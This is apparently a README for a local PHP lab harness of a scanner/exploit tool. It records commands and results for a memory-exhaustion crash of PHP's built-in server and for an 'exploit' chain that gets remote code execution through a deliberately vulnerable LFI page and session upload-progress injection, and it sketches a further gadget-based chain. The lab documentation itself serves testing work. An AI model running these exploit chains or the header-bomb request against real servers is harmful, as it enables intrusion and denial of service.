# v4 local lab (`cli-server`)

This is a **real local PHP harness**, not a claim of CVE proof.

Start the built-in server (single process, SAPI `cli-server`):

```bash
php -d memory_limit=16M -d post_max_size=8M -d log_errors=1 \
    -d error_log=lab/v4/php-error.log -d display_errors=0 \
    -S 127.0.0.1:8099 -t lab/v4/www
```

Why `cli-server` matters: neither advisory evaluates the PHP built-in server.
A real OOM observed here is `OOM_OBSERVED`, never `AFFECTED_PATH_CONFIRMED`.
For mod_php/FPM proof use the Docker matrix in `lab/matrix/` on a host with a
working Docker daemon; the scanner refuses to invent the missing trace.

## What was actually run

With PHP 8.2.12 and `memory_limit=16M`:

```bash
python php2shell_scanner_v4.py inventory http://127.0.0.1:8099 \
    --status-url http://127.0.0.1:8099/status.php \
    --environment-kind lab --out runs/lab-618-s2-v3

python php2shell_scanner_v4.py probe http://127.0.0.1:8099 \
    --status-url http://127.0.0.1:8099/status.php \
    --environment-kind lab --out runs/lab-618-s2-v3

python php2shell_scanner_v4.py prove http://127.0.0.1:8099 \
    --scenario 618-S2 --ack-authorised \
    --status-url http://127.0.0.1:8099/status.php \
    --health-url http://127.0.0.1:8099/status.php \
    --telemetry lab/v4/php-error.log \
    --environment-kind lab --out runs/lab-618-s2-v3
```

Results:

- `inventory`: both CVEs `EXPOSED_BUILD`, status endpoint verified, hash PASS.
- `probe`: `REACHED`, status endpoint verified.
- `prove 618-S2`: the 5,000-header multipart request exhausted PHP memory and
  the server process died. 109618 = `OOM_OBSERVED`; 109619 = `EXPOSED_BUILD`.
- The OOM log line was attached by the request time window only (no request id
  or worker PID), so it cannot support `AFFECTED_PATH_CONFIRMED`.

The server dies on OOM. Restart it before another prove run.

`status.php` echoes the scanner's per-request nonce and request id and reports
`PHP_VERSION`, `PHP_SAPI`, `getmypid()`, memory limits and session settings.
That is what lets `--status-url` upgrade build/SAPI trust from low to high.

The OOM line is real:

```text
[23-Oct-2026 19:49:28 Europe/Berlin] PHP Fatal error:  Allowed memory size of 16777216 bytes exhausted (tried to allocate 4096 bytes) in Unknown on line 0
```

## Exploit mode lab run

The same `lab/www` harness contains a deliberately vulnerable LFI
(`vuln.php`). It was used to exercise exploit chains A and C end to end:

```powershell
# Start the lab on Windows. cleanup=0 keeps the upload-progress session file
# alive after the injection request; cleanup=1 (PHP default) needs a race or a
# concurrent server.
php -d memory_limit=16M -d post_max_size=8M -d log_errors=1 `
    -d error_log=lab/v4/php-error.log -d display_errors=0 `
    -d session.save_path="C:\Users\Vinh No\Downloads\php2shell\lab\sessions" `
    -d session.upload_progress.cleanup=0 `
    -S 127.0.0.1:8099 -t lab/www

python php2shell_scanner_v4.py exploit http://127.0.0.1:8099 `
    --chain C --ack-authorised `
    --lfi-path "/vuln.php?file=" `
    --inject-path /index.php `
    --session-path "C:\Users\Vinh No\Downloads\php2shell\lab\sessions\sess_" `
    --callback-port 0 --callback-expect 127.0.0.1 `
    --command whoami --environment-kind lab `
    --health-url http://127.0.0.1:8099/status.php `
    --attempts 1 --out runs/lab-exploit-c4
```

Observed result (real callback, not a marker):

```text
[RCE OBSERVED] chain C
attribution : not_established (callback proves execution, not which CVE path)
command out : vinhtq\vinh no
callback    : 127.0.0.1
```

`runs/lab-exploit-a2` is the equivalent chain A run. `verify` passes for both.
Both CVEs remain `INCONCLUSIVE`: the callback proves payload execution on a
deliberately vulnerable LFI page, not the 109618/109619 OOM or stale-state
primitive. Chain B was not run because it requires an operator-supplied POP
chain and its OOM producer can kill this single-process server.

Chain B was probed separately: posting the ~2 MiB part-header bomb to
`127.0.0.1:8099` with `display_errors=1` produced a connection reset and the
`php -S` process exited, so the gadget injection and trigger steps cannot run on
`cli-server`. Chain B needs a multi-worker SAPI (mod_php/FPM). Its gadget is a
static serialised string, so it also needs `--canary-nonce` (with
`--callback-port`) embedded in the gadget's callback URL for the callback to
match; the scanner cannot inject its runtime nonce into a serialised payload.

`--session-path` must be a full path without `~`; PHP on Windows interprets a
`~` in `session.save_path` specially, which silently falls back to the user
profile directory.
